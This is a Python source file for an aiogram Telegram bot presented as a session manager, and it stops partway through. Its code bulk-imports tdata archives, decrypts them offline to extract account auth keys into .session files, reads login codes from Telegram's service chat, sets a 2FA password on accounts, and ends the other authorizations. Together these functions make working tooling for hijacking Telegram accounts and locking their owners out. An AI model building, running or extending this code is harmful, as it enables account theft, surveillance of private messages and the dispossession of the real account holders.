import asyncio

try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

import os
import json
import logging
import hashlib
import importlib.util
import re
import shutil
import sys
import tempfile
import zipfile
from datetime import datetime, timedelta
from aiogram import BaseMiddleware, Bot, Dispatcher, types, F, Router
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Библиотеки для работы с Telegram сессиями
from telethon import TelegramClient, functions
from telethon.crypto import AuthKey as TelethonAuthKey
from telethon.sessions import SQLiteSession
from pyrogram import Client as PyroClient

# Настройка логирования
logging.basicConfig(level=logging.INFO)

# --- КОНФИГУРАЦИЯ ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(BASE_DIR, "config.local.json")
DEFAULT_OWNER_ID = 8700330523

def parse_owner_ids(config: dict):
    env_value = os.getenv("OWNER_IDS")
    if env_value:
        values = env_value.split(",")
    elif config.get("owner_ids"):
        values = config["owner_ids"]
    else:
        values = [os.getenv("OWNER_ID") or config.get("owner_id", DEFAULT_OWNER_ID)]

    owner_ids = []
    for value in values:
        owner_id = int(str(value).strip())
        if owner_id not in owner_ids:
            owner_ids.append(owner_id)
    return owner_ids

def load_config():
    config = {}
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r", encoding="utf-8") as file:
            config.update(json.load(file))

    return {
        "api_id": int(os.getenv("API_ID") or config.get("api_id", 0)),
        "api_hash": os.getenv("API_HASH") or config.get("api_hash", ""),
        "bot_token": os.getenv("BOT_TOKEN") or config.get("bot_token", ""),
        "owner_ids": parse_owner_ids(config),
    }

CONFIG = load_config()
API_ID = CONFIG["api_id"]
API_HASH = CONFIG["api_hash"]
BOT_TOKEN = CONFIG["bot_token"]
OWNER_IDS = frozenset(CONFIG["owner_ids"])
SESSION_DIR = os.path.join(BASE_DIR, "sessions")
ADMINS_FILE = os.path.join(BASE_DIR, "admins.json")
HISTORY_FILE = os.path.join(SESSION_DIR, "accounts.json")
BATCH_FILE = os.path.join(SESSION_DIR, "bulk_batches.json")
CODE_PATTERN = re.compile(r"\b\d{5,6}\b")
TELEGRAM_TEXT_LIMIT = 3900
SESSIONS_PER_PAGE = 7
TELEGRAM_DC_OPTIONS = {
    1: ("149.154.175.50", 443),
    2: ("149.154.167.51", 443),
    3: ("149.154.175.100", 443),
    4: ("149.154.167.91", 443),
    5: ("149.154.171.5", 443),
}

if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

if not BOT_TOKEN or not API_ID or not API_HASH:
    raise RuntimeError("Заполните BOT_TOKEN, API_ID и API_HASH в config.local.json или переменных окружения.")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

# --- СОСТОЯНИЯ ---
class SessionStates(StatesGroup):
    waiting_for_file = State()
    waiting_for_bulk_tdata = State()
    waiting_for_bulk_sessions = State()
    waiting_for_json = State()
    waiting_for_2fa = State()
    waiting_for_admin_id = State()
    waiting_for_admin_days = State()

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def sanitize_filename(value: str) -> str:
    return "".join(ch if ch.isalnum() or ch in "._-" else "_" for ch in value)

def get_session_type(session_name: str) -> str:
    if session_name.startswith("tdata_"):
        return "tdata"
    if "telethon" in session_name or "json" in session_name or session_name.startswith("converted_"):
        return "telethon"
    return "pyrogram"

def get_pyrogram_session_name(session_path: str) -> str:
    return os.path.splitext(os.path.basename(session_path))[0]

def list_saved_accounts():
    accounts = [f for f in os.listdir(SESSION_DIR) if f.endswith(".session")]
    accounts.extend(
        f for f in os.listdir(SESSION_DIR)
        if f.startswith("tdata_") and os.path.isdir(os.path.join(SESSION_DIR, f))
    )
    return sorted(accounts)

def account_key(session_name: str) -> str:
    return hashlib.sha1(session_name.encode("utf-8")).hexdigest()[:12]

def resolve_account_key(key: str) -> str | None:
    for session_name in list_saved_accounts():
        if account_key(session_name) == key:
            return session_name
    return None

def resolve_account_identifier(identifier: str) -> str | None:
    decoded = identifier.strip()
    if decoded in list_saved_accounts():
        return decoded
    return resolve_account_key(decoded)

def sync_history_with_files():
    history = load_history()
    existing = set(list_saved_accounts())

    for session_name in existing:
        if session_name not in history:
            history[session_name] = {
                "type": get_session_type(session_name),
                "status": "active",
                "added_at": "раньше запуска истории",
                "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }

    for session_name in list(history):
        if session_name not in existing:
            history.pop(session_name, None)

    save_history(history)

def load_history():
    if not os.path.exists(HISTORY_FILE):
        return {}

    try:
        with open(HISTORY_FILE, "r", encoding="utf-8") as file:
            return json.load(file)
    except (json.JSONDecodeError, OSError):
        return {}

def save_history(history: dict):
    with open(HISTORY_FILE, "w", encoding="utf-8") as file:
        json.dump(history, file, ensure_ascii=False, indent=2)

def load_batches():
    if not os.path.exists(BATCH_FILE):
        return {}

    try:
        with open(BATCH_FILE, "r", encoding="utf-8") as file:
            return json.load(file)
    except (json.JSONDecodeError, OSError):
        return {}

def save_batches(batches: dict):
    with open(BATCH_FILE, "w", encoding="utf-8") as file:
        json.dump(batches, file, ensure_ascii=False, indent=2)

def load_admins():
    if not os.path.exists(ADMINS_FILE):
        return []

    try:
        with open(ADMINS_FILE, "r", encoding="utf-8") as file:
            data = json.load(file)
            admins = data.get("admins", [])
            if admins and isinstance(admins[0], int):
                return [
                    {
                        "id": int(admin_id),
                        "expires_at": None,
                        "added_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    }
                    for admin_id in admins
                ]

            return [
                {
                    "id": int(item["id"]),
                    "expires_at": item.get("expires_at"),
                    "added_at": item.get("added_at") or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }
                for item in admins
                if int(item.get("id", 0)) not in OWNER_IDS
            ]
    except (json.JSONDecodeError, OSError, ValueError):
        return []

def save_admins(admins: list[dict]):
    clean_admins = []
    seen = set()
    for item in admins:
        admin_id = int(item["id"])
        if admin_id in OWNER_IDS or admin_id in seen:
            continue
        seen.add(admin_id)
        clean_admins.append({
            "id": admin_id,
            "expires_at": item.get("expires_at"),
            "added_at": item.get("added_at") or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        })
    clean_admins.sort(key=lambda item: item["id"])
    with open(ADMINS_FILE, "w", encoding="utf-8") as file:
        json.dump({"admins": clean_admins}, file, ensure_ascii=False, indent=2)

def parse_admin_expire(expires_at: str | None):
    if not expires_at:
        return None
    return datetime.strptime(expires_at, "%Y-%m-%d %H:%M:%S")

def is_admin_active(admin: dict):
    expires_at = parse_admin_expire(admin.get("expires_at"))
    return expires_at is None or expires_at > datetime.now()

def cleanup_expired_admins():
    admins = load_admins()
    active_admins = [admin for admin in admins if is_admin_active(admin)]
    if len(active_admins) != len(admins):
        save_admins(active_admins)
    return active_admins

def get_admin_label(admin: dict):
    expires_at = admin.get("expires_at")
    if expires_at:
        return f"{admin['id']} | до {expires_at}"
    return f"{admin['id']} | навсегда"

def build_admin_entry(admin_id: int, days: int):
    expires_at = None
    if days > 0:
        expires_at = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    return {
        "id": int(admin_id),
        "expires_at": expires_at,
        "added_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

def is_owner(user_id: int | None):
    return user_id is not None and int(user_id) in OWNER_IDS

def is_admin(user_id: int | None):
    if user_id is None:
        return False
    return is_owner(user_id) or any(admin["id"] == int(user_id) for admin in cleanup_expired_admins())

class AccessMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        user = data.get("event_from_user")
        user_id = user.id if user else None

        if is_admin(user_id):
            return await handler(event, data)

        if isinstance(event, types.CallbackQuery):
            await event.answer("Нет доступа", show_alert=True)
            return None

        if isinstance(event, types.Message):
            await event.answer("Нет доступа. Обратитесь к владельцу бота.")
            return None

        return None

router.message.middleware(AccessMiddleware())
router.callback_query.middleware(AccessMiddleware())

def update_history(session_name: str, account_info: dict | None = None, status: str = "active"):
    history = load_history()
    current = history.get(session_name, {})
    current.update({
        "type": get_session_type(session_name),
        "status": status,
        "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    })

    if "added_at" not in current:
        current["added_at"] = current["updated_at"]

    if account_info:
        current.update(account_info)
        current.pop("last_error", None)

    history[session_name] = current
    save_history(history)

def remove_from_history(session_name: str):
    history = load_history()
    if session_name in history:
        history.pop(session_name)
        save_history(history)

def format_account_label(session_name: str) -> str:
    info = load_history().get(session_name, {})
    account_type = info.get("type") or get_session_type(session_name)
    added_at = info.get("added_at", "дата неизвестна").split(" ")[0]
    source_name = info.get("source_base") or session_name
    return f"{source_name} | {account_type} | {added_at}"

def format_account_details(session_name: str) -> str:
    info = load_history().get(session_name, {})
    lines = [
        f"Аккаунт: {session_name}",
        f"Тип: {info.get('type') or get_session_type(session_name)}",
        f"Номер: {info.get('phone') or 'не удалось определить'}",
        f"ID: {info.get('user_id') or 'не удалось определить'}",
    ]

    name = " ".join(part for part in (info.get("first_name"), info.get("last_name")) if part)
    if name:
        lines.append(f"Имя: {name}")
    if info.get("username"):
        lines.append(f"Username: @{info['username']}")
    if info.get("added_at"):
        lines.append(f"Добавлена: {info['added_at']}")
    if info.get("last_code_at"):
        lines.append(f"Код проверен: {info['last_code_at']}")

    return "\n".join(lines)

def derive_tdata_source_base(tdata_name: str) -> str:
    info = load_history().get(tdata_name, {})
    if info.get("source_base"):
        return sanitize_filename(info["source_base"])

    parts = tdata_name.split("_")
    if len(parts) >= 7 and parts[0] == "tdata" and parts[2] == "bulk":
        return sanitize_filename("_".join(parts[6:]))
    if len(parts) >= 3 and parts[0] == "tdata":
        return sanitize_filename("_".join(parts[2:]))
    return sanitize_filename(tdata_name)

def make_output_path(base_name: str, extension: str):
    safe_base = sanitize_filename(base_name) or "converted"
    file_name = f"{safe_base}.{extension}"
    return file_name, os.path.join(SESSION_DIR, file_name)

def zip_tdata_dir(tdata_dir: str, zip_path: str):
    if os.path.exists(zip_path):
        os.remove(zip_path)

    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as archive:
        for root, _, files in os.walk(tdata_dir):
            for file_name in files:
                full_path = os.path.join(root, file_name)
                relative_path = os.path.relpath(full_path, tdata_dir)
                archive.write(full_path, os.path.join("tdata", relative_path))

def build_bulk_sessions_zip(batch_id: str, converted: list[dict]):
    zip_name = f"{sanitize_filename(batch_id)}_sessions.zip"
    zip_path = os.path.join(SESSION_DIR, zip_name)
    if os.path.exists(zip_path):
        os.remove(zip_path)

    used_names = set()
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as archive:
        for result in converted:
            source_path = result.get("session_path")
            file_name = result.get("session_name")
            if not source_path or not os.path.exists(source_path):
                continue

            archive_name = os.path.join("sessions", file_name or os.path.basename(source_path))
            base_name, extension = os.path.splitext(archive_name)
            suffix = 2
            while archive_name.lower() in used_names:
                archive_name = f"{base_name}_{suffix}{extension}"
                suffix += 1
            used_names.add(archive_name.lower())
            archive.write(source_path, archive_name)

    return zip_name, zip_path

def delete_local_account(session_name: str):
    path = os.path.join(SESSION_DIR, session_name)
    if os.path.isdir(path):
        shutil.rmtree(path)
    elif os.path.exists(path):
        os.remove(path)
    remove_from_history(session_name)

def safe_extract_zip(zip_path: str, destination: str):
    destination_abs = os.path.abspath(destination)
    with zipfile.ZipFile(zip_path) as archive:
        for member in archive.infolist():
            normalized_name = member.filename.replace("\\", "/").lstrip("/")
            parts = [part for part in normalized_name.split("/") if part not in ("", ".")]
            if not parts:
                continue
            if any(part == ".." for part in parts):
                raise ValueError("Архив содержит небезопасные пути.")

            member_path = os.path.abspath(os.path.join(destination, *parts))
            if os.path.commonpath([destination_abs, member_path]) != destination_abs:
                raise ValueError("Архив содержит небезопасные пути.")

            if member.is_dir() or normalized_name.endswith("/"):
                os.makedirs(member_path, exist_ok=True)
                continue

            os.makedirs(os.path.dirname(member_path), exist_ok=True)
            with archive.open(member) as source, open(member_path, "wb") as target:
                shutil.copyfileobj(source, target, length=1024 * 1024)

def find_tdata_paths(root_path: str):
    found = []
    for current_root, dirs, files in os.walk(root_path):
        if any(file_name.lower() == "key_datas" for file_name in files):
            found.append(current_root)
            dirs[:] = []
    return found

def get_tdata_source_label(tdata_path: str, extract_dir: str, archive_base: str, common_prefix: str | None = None):
    relative_path = os.path.relpath(tdata_path, extract_dir)
    if relative_path == ".":
        return archive_base

    parts = relative_path.split(os.sep)
    if common_prefix and common_prefix != ".":
        common_parts = common_prefix.split(os.sep)
        if parts[:len(common_parts)] == common_parts:
            remaining = parts[len(common_parts):]
            if remaining:
                return remaining[0]

    if len(parts) >= 3 and parts[-1].lower() == "tdata":
        return parts[0]
    if parts[-1].lower() == "tdata" and len(parts) > 1:
        return parts[-2]
    return parts[-1]

def describe_tdata_layout(root_path: str):
    entries = []
    for current_root, dirs, files in os.walk(root_path):
        relative = os.path.relpath(current_root, root_path)
        if relative != ".":
            entries.append(relative)
        entries.extend(os.path.join(relative, file_name) for file_name in files[:3])
        if len(entries) >= 15:
            break
    return ", ".join(entries[:15]) or "архив пуст"

async def save_tdata_document_multi(message: types.Message, name_prefix: str):
    archive_base = sanitize_filename(os.path.splitext(message.document.file_name)[0]) or "tdata"
    work_name = f"{name_prefix}_{hashlib.sha1(message.document.file_unique_id.encode()).hexdigest()[:10]}"
    zip_path = os.path.join(SESSION_DIR, f"{work_name}.zip")
    extract_dir = os.path.join(SESSION_DIR, f"{work_name}_extract")

    os.makedirs(SESSION_DIR, exist_ok=True)
    try:
        file = await bot.get_file(message.document.file_id)
        with open(zip_path, "wb") as destination:
            await bot.download_file(file.file_path, destination)

        if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
            raise RuntimeError(f"Telegram не скачал архив во временный файл: {zip_path}")

        if os.path.exists(extract_dir):
            shutil.rmtree(extract_dir)

        os.makedirs(extract_dir, exist_ok=True)
        safe_extract_zip(zip_path, extract_dir)
        found_paths = find_tdata_paths(extract_dir)
        if not found_paths:
            layout = describe_tdata_layout(extract_dir)
            raise ValueError(f"Не найдено ни одной tdata с файлом key_datas. Структура: {layout}")

        saved = []
        used_names = set()
        relative_paths = [os.path.relpath(path, extract_dir) for path in found_paths]
        common_prefix = os.path.commonpath(relative_paths) if len(relative_paths) > 1 else None
        for index, found_path in enumerate(found_paths, start=1):
            relative_source = os.path.relpath(found_path, extract_dir)
            source_label = sanitize_filename(
                get_tdata_source_label(found_path, extract_dir, archive_base, common_prefix)
            )[:80] or f"account_{index}"
            unique_label = source_label
            suffix = 2
            while unique_label.lower() in used_names:
                unique_label = f"{source_label}_{suffix}"
                suffix += 1
            used_names.add(unique_label.lower())

            tdata_name = f"{name_prefix}_{index}_{unique_label}"
            target_dir = os.path.join(SESSION_DIR, tdata_name)
            if os.path.exists(target_dir):
                shutil.rmtree(target_dir)
            shutil.copytree(found_path, target_dir)

            update_history(tdata_name, {
                "source_base": unique_label,
                "source_archive": message.document.file_name,
                "source_path": relative_source,
            })
            saved.append({
                "tdata_name": tdata_name,
                "source_base": unique_label,
                "source_path": relative_source,
            })

        return {
            "saved": saved,
            "candidates_count": len(found_paths),
        }
    finally:
        if os.path.exists(zip_path):
            os.remove(zip_path)
        if os.path.exists(extract_dir):
            shutil.rmtree(extract_dir)

def patch_opentele_python314():
    spec = importlib.util.find_spec("opentele")
    if not spec or not spec.origin:
        return False

    utils_path = os.path.join(os.path.dirname(spec.origin), "utils.py")
    if not os.path.exists(utils_path):
        return False

    with open(utils_path, "r", encoding="utf-8") as file:
        content = file.read()

    patched = content
    for attr in ("__firstlineno__", "__static_attributes__"):
        if attr not in patched:
            patched = patched.replace('"__doc__"', f'"__doc__",\n            "{attr}"')

    if patched == content:
        return True

    with open(utils_path, "w", encoding="utf-8") as file:
        file.write(patched)
    return True

def load_opentele():
    try:
        from opentele.api import UseCurrentSession
        from opentele.td import TDesktop
        return TDesktop, UseCurrentSession
    except ImportError as e:
        raise RuntimeError(f"Установите зависимости: pip install -r requirements.txt ({e})")
    except BaseException as e:
        if sys.version_info < (3, 14) or not patch_opentele_python314():
            raise RuntimeError(f"opentele не загрузился: {e}")

        for module_name in list(sys.modules):
            if module_name == "opentele" or module_name.startswith("opentele."):
                sys.modules.pop(module_name, None)

        try:
            from opentele.api import UseCurrentSession
            from opentele.td import TDesktop
            return TDesktop, UseCurrentSession
        except BaseException as retry_error:
            raise RuntimeError(f"opentele не загрузился после патча совместимости: {retry_error}")

def normalize_opentele_error(error: BaseException):
    text = str(error).strip() or error.__class__.__name__
    if "No account has been loaded" in text:
        return (
            "в папке найден key_datas, но Telegram-аккаунт не загрузился. "
            "Обычно tdata неполная, повреждена, защищена паролем или выбрана не корневая папка tdata"
        )
    return text

def load_tdesktop_local(tdata_path: str):
    TDesktop, UseCurrentSession = load_opentele()
    try:
        tdesk = TDesktop(tdata_path)
    except (KeyboardInterrupt, SystemExit, GeneratorExit):
        raise
    except BaseException as error:
        raise RuntimeError(normalize_opentele_error(error)) from error

    if not tdesk.isLoaded() or getattr(tdesk, "accountsCount", 0) < 1:
        raise RuntimeError("tdata прочитана, но внутри не найдено ни одного Telegram-аккаунта")

    return tdesk, UseCurrentSession

def load_tdata_accounts_direct(tdata_path: str):
    try:
        from PyQt5.QtCore import QByteArray, QDataStream
        from opentele.td import AuthKey, Storage
    except ImportError as e:
        raise RuntimeError(f"не удалось загрузить зависимости для прямого чтения tdata: {e}") from e

    try:
        key_data = Storage.ReadFile("key_data", tdata_path)
        salt = QByteArray()
        key_encrypted = QByteArray()
        info_encrypted = QByteArray()
        key_data.stream >> salt >> key_encrypted >> info_encrypted

        passcode_key = Storage.CreateLocalKey(salt, QByteArray())
        key_inner_data = Storage.DecryptLocal(key_encrypted, passcode_key)
        local_key = AuthKey(key_inner_data.stream.readRawData(256))

        info = Storage.DecryptLocal(info_encrypted, local_key)
        count = info.stream.readInt32()
        if count <= 0:
            raise RuntimeError("в key_datas нет аккаунтов")

        indexes = []
        for _ in range(count):
            account_index = info.stream.readInt32()
            if 0 <= account_index < 3:
                indexes.append(account_index)

        active_index = None
        if not info.stream.atEnd():
            active_index = info.stream.readInt32()
        if active_index in indexes:
            indexes.remove(active_index)
            indexes.insert(0, active_index)

        accounts = []
        for account_index in indexes:
            data_name = Storage.ComposeDataString("data", account_index)
            data_name_key = Storage.ComputeDataNameKey(data_name)
            file_part = Storage.ToFilePart(data_name_key)

            try:
                mtp = Storage.ReadEncryptedFile(file_part, tdata_path, local_key)
                block_id = mtp.stream.readInt32()
                if block_id != 75:
                    continue

                serialized = QByteArray()
                mtp.stream >> serialized
                stream = QDataStream(serialized)
                stream.setVersion(QDataStream.Version.Qt_5_1)

                user_id = stream.readInt32()
                main_dc = stream.readInt32()
                if ((user_id << 32) | main_dc) == int(~0):
                    user_id = stream.readUInt64()
                    main_dc = stream.readInt32()

                keys = []
                key_count = stream.readInt32()
                for _ in range(max(0, key_count)):
                    dc_id = stream.readInt32()
                    key_bytes = bytes(stream.readRawData(256))
                    if len(key_bytes) == 256:
                        keys.append((dc_id, key_bytes))

                destroy_count = stream.readInt32()
                for _ in range(max(0, destroy_count)):
                    stream.readInt32()
                    stream.readRawData(256)

                auth_key = next((key for dc_id, key in keys if dc_id == main_dc), None)
                if not auth_key and keys:
                    main_dc, auth_key = keys[0]

                if auth_key:
                    accounts.append({
                        "index": account_index,
                        "user_id": int(user_id) if user_id else None,
                        "main_dc": int(main_dc),
                        "auth_key": auth_key,
                    })
            except Exception:
                continue

        if not accounts:
            raise RuntimeError("не удалось найти MTP auth_key внутри tdata")

        return accounts
    except Exception as e:
        if isinstance(e, RuntimeError):
            raise
        raise RuntimeError(f"не удалось прочитать tdata напрямую: {normalize_opentele_error(e)}") from e

def write_telethon_session_offline(output_session_path: str, account: dict):
    dc_id = int(account.get("main_dc") or 0)
    if dc_id not in TELEGRAM_DC_OPTIONS:
        raise RuntimeError(f"неизвестный Telegram DC: {dc_id}")

    server_address, port = TELEGRAM_DC_OPTIONS[dc_id]
    if os.path.exists(output_session_path):
        os.remove(output_session_path)

    session = SQLiteSession(output_session_path)
    try:
        session.set_dc(dc_id, server_address, port)
        session.auth_key = TelethonAuthKey(data=account["auth_key"])
        session.save()
    finally:
        session.close()

def convert_tdata_to_session_direct(tdata_path: str, output_session_path: str):
    accounts = load_tdata_accounts_direct(tdata_path)
    last_error = None
    for account in accounts:
        try:
            write_telethon_session_offline(output_session_path, account)
            return output_session_path
        except Exception as e:
            last_error = e

    raise RuntimeError(f"не удалось записать .session: {last_error}")

async def convert_tdata_to_session(tdata_path: str, output_session_path: str, verify: bool = False):
    try:
        tdesk, UseCurrentSession = load_tdesktop_local(tdata_path)
    except RuntimeError as opentele_error:
        try:
            return convert_tdata_to_session_direct(tdata_path, output_session_path)
        except Exception as direct_error:
            raise RuntimeError(
                f"{opentele_error}; прямое чтение тоже не сработало: {direct_error}"
            ) from direct_error

    try:
        client = await tdesk.ToTelethon(session=output_session_path, flag=UseCurrentSession)
        client.session.save()
    except (KeyboardInterrupt, SystemExit, GeneratorExit):
        raise
    except BaseException as error:
        if os.path.exists(output_session_path):
            os.remove(output_session_path)
        try:
            return convert_tdata_to_session_direct(tdata_path, output_session_path)
        except Exception:
            pass
        raise RuntimeError(f"не удалось создать .session: {normalize_opentele_error(error)}") from error

    if not verify:
        client.session.close()
        return output_session_path

    try:
        await client.connect()
        if not await client.is_user_authorized():
            raise RuntimeError("tdata не авторизована или сессия недействительна.")
    finally:
        await client.disconnect()

    return output_session_path

def build_account_info(user) -> dict:
    phone = getattr(user, "phone_number", None) or getattr(user, "phone", None)
    if phone and not str(phone).startswith("+"):
        phone = f"+{phone}"

    return {
        "user_id": getattr(user, "id", None),
        "phone": phone,
        "first_name": getattr(user, "first_name", None),
        "last_name": getattr(user, "last_name", None),
        "username": getattr(user, "username", None),
    }

async def get_account_info(session_path: str, lib_type: str = "telethon") -> dict:
    if lib_type == "telethon":
        async with TelegramClient(session_path, API_ID, API_HASH) as client:
            if not await client.is_user_authorized():
                raise RuntimeError("сессия не авторизована")
            return build_account_info(await client.get_me())

    if lib_type == "pyrogram":
        async with PyroClient(get_pyrogram_session_name(session_path), api_id=API_ID, api_hash=API_HASH, workdir=SESSION_DIR) as app:
            return build_account_info(await app.get_me())

    if lib_type == "tdata":
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_session = os.path.join(temp_dir, "tdata_info.session")
            await convert_tdata_to_session(session_path, temp_session)
            return await get_account_info(temp_session, "telethon")

    raise RuntimeError(f"неизвестный тип сессии: {lib_type}")

async def convert_tdata_account(tdata_name: str):
    tdata_path = os.path.join(SESSION_DIR, tdata_name)
    output_base = derive_tdata_source_base(tdata_name)
    output_name, output_path = make_output_path(output_base, "session")

    if os.path.exists(output_path):
        output_base = f"{output_base}_{account_key(tdata_name)[:6]}"
        output_name, output_path = make_output_path(output_base, "session")

    await convert_tdata_to_session(tdata_path, output_path, verify=False)
    info = load_history().get(tdata_name, {})
    update_history(output_name, info if info else None)

    return {
        "tdata_name": tdata_name,
        "session_name": output_name,
        "session_path": output_path,
        "phone": info.get("phone") if info else None,
        "user_id": info.get("user_id") if info else None,
    }

async def convert_session_to_tdata(session_name: str):
    TDesktop, UseCurrentSession = load_opentele()
    info = load_history().get(session_name, {})
    user_id = info.get("user_id")
    if not user_id:
        raise RuntimeError("Для пассивной обратной конвертации нужен user_id в истории. Нажмите 'Обновить номер', потом повторите.")

    base_name = sanitize_filename(info.get("source_base") or os.path.splitext(os.path.basename(session_name))[0])
    session_path = os.path.join(SESSION_DIR, session_name)
    tdata_dir_name = f"{base_name}_tdata"
    tdata_dir = os.path.join(SESSION_DIR, tdata_dir_name)
    zip_name = f"{tdata_dir_name}.zip"
    zip_path = os.path.join(SESSION_DIR, zip_name)

    if os.path.exists(tdata_dir):
        shutil.rmtree(tdata_dir)

    client = TelegramClient(session_path, API_ID, API_HASH)
    client.UserId = int(user_id)
    tdesk = await TDesktop.FromTelethon(client, flag=UseCurrentSession)
    tdesk.SaveTData(tdata_dir)
    zip_tdata_dir(tdata_dir, zip_path)

    return {
        "zip_name": zip_name,
        "zip_path": zip_path,
        "tdata_dir": tdata_dir,
        "phone": info.get("phone"),
        "user_id": user_id,
    }

async def convert_session_account_to_tdata(session_name: str):
    history = load_history()
    current = history.get(session_name, {})

    if not current.get("user_id"):
        info = await get_account_info(os.path.join(SESSION_DIR, session_name), "telethon")
        info["source_base"] = current.get("source_base") or os.path.splitext(os.path.basename(session_name))[0]
        update_history(session_name, info)

    result = await convert_session_to_tdata(session_name)
    result["session_name"] = session_name
    return result

async def remember_account(session_name: str):
    path = os.path.join(SESSION_DIR, session_name)
    try:
        info = await get_account_info(path, get_session_type(session_name))
        update_history(session_name, info)
        return info
    except Exception as e:
        update_history(session_name, {"last_error": str(e)})
        logging.warning("Не удалось определить аккаунт для %s: %s", session_name, e)
        return None

def extract_code_from_text(text: str | None):
    if not text:
        return None

    match = CODE_PATTERN.search(text)
    return match.group(0) if match else None

def trim_telegram_text(text: str, limit: int = TELEGRAM_TEXT_LIMIT) -> str:
    if len(text) <= limit:
        return text
    return f"{text[:limit - 20]}\n\n...текст обрезан"

async def get_last_code(session_path, lib_type="telethon"):
    """Получает последний код из чата 777000"""
    try:
        if lib_type == "telethon":
            async with TelegramClient(session_path, API_ID, API_HASH) as client:
                if not await client.is_user_authorized():
                    return "Сессия не авторизована."

                last_text = None
                async for message in client.iter_messages(777000, limit=10):
                    if message.text and not last_text:
                        last_text = message.text
                    code = extract_code_from_text(message.text)
                    if code:
                        return trim_telegram_text(f"Код: {code}\n\nСообщение:\n{message.text}")
                if last_text:
                    return trim_telegram_text(f"Код не найден, последнее сообщение:\n{last_text}")
        elif lib_type == "pyrogram":
            async with PyroClient(get_pyrogram_session_name(session_path), api_id=API_ID, api_hash=API_HASH, workdir=SESSION_DIR) as app:
                last_text = None
                async for message in app.get_chat_history(777000, limit=10):
                    if message.text and not last_text:
                        last_text = message.text
                    code = extract_code_from_text(message.text)
                    if code:
                        return trim_telegram_text(f"Код: {code}\n\nСообщение:\n{message.text}")
                if last_text:
                    return trim_telegram_text(f"Код не найден, последнее сообщение:\n{last_text}")
        elif lib_type == "tdata":
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_session = os.path.join(temp_dir, "tdata_check.session")
                await convert_tdata_to_session(session_path, temp_session)
                return await get_last_code(temp_session, "telethon")
    except Exception as e:
        return f"Ошибка при получении кода: {str(e)}"
    return "Сообщений от Telegram не найдено."

async def set_cloud_password(session_path, password, lib_type="telethon"):
    """Установка 2FA"""
    try:
        if lib_type == "telethon":
            async with TelegramClient(session_path, API_ID, API_HASH) as client:
                await client.edit_2fa(new_password=password)
        elif lib_type == "pyrogram":
            async with PyroClient(get_pyrogram_session_name(session_path), api_id=API_ID, api_hash=API_HASH, workdir=SESSION_DIR) as app:
                await app.enable_cloud_password(password)
        return True
    except Exception as e:
        logging.error(f"2FA Error: {e}")
        return False

def authorization_timestamp(auth):
    date_active = getattr(auth, "date_active", None)
    date_created = getattr(auth, "date_created", None)
    return date_active or date_created or datetime.min

async def terminate_old_authorizations_keep_latest(session_path: str):
    async with TelegramClient(session_path, API_ID, API_HASH) as client:
        if not await client.is_user_authorized():
            raise RuntimeError("сессия чекера не авторизована")

        result = await client(functions.account.GetAuthorizationsRequest())
        authorizations = result.authorizations
        other_authorizations = [auth for auth in authorizations if not getattr(auth, "current", False)]
        keep_auth = max(other_authorizations, key=authorization_timestamp) if other_authorizations else None

        terminated_old = 0
        for auth in other_authorizations:
            if keep_auth and auth.hash == keep_auth.hash:
                continue
            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
            terminated_old += 1

        await client.log_out()

    return {
        "kept": {
            "app_name": getattr(keep_auth, "app_name", None),
            "device_model": getattr(keep_auth, "device_model", None),
            "date_active": str(getattr(keep_auth, "date_active", "")),
        } if keep_auth else None,
        "terminated_old": terminated_old,
        "checker_logged_out": True,
    }

# --- ХЭНДЛЕРЫ ---

@router.message(Command("start"))
async def cmd_start(message: types.Message):
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Добавить сессию", callback_data="add_session"))
    builder.row(types.InlineKeyboardButton(text="Список сессий", callback_data="list_sessions"))
    
    await message.answer("Менеджер сессий готов к работе.\nВыберите действие:", reply_markup=builder.as_markup())

@router.message(Command("admins"))
async def cmd_admins(message: types.Message):
    if not is_owner(message.from_user.id):
        await message.answer("Команда доступна только владельцу.")
        return

    await show_admins_menu(message)

async def show_admins_menu(message: types.Message, is_edit: bool = False):
    admins = cleanup_expired_admins()
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Добавить админа", callback_data="admin_add"))
    if admins:
        builder.row(types.InlineKeyboardButton(text="Удалить админа", callback_data="admin_remove_menu"))
    builder.row(types.InlineKeyboardButton(text="В меню", callback_data="back_to_main"))

    lines = ["Владельцы:"]
    lines.extend(str(owner_id) for owner_id in sorted(OWNER_IDS))
    lines.extend(["", "Админы:"])
    if admins:
        lines.extend(get_admin_label(admin) for admin in admins)
    else:
        lines.append("пока нет")

    text = "\n".join(lines)
    if is_edit:
        await message.edit_text(text, reply_markup=builder.as_markup())
    else:
        await message.answer(text, reply_markup=builder.as_markup())

@router.callback_query(F.data == "admin_add")
async def action_admin_add(callback: types.CallbackQuery, state: FSMContext):
    if not is_owner(callback.from_user.id):
        await callback.answer("Только владелец", show_alert=True)
        return

    await state.set_state(SessionStates.waiting_for_admin_id)
    await callback.message.answer("Отправьте Telegram ID нового админа.")
    await callback.answer()

@router.message(SessionStates.waiting_for_admin_id)
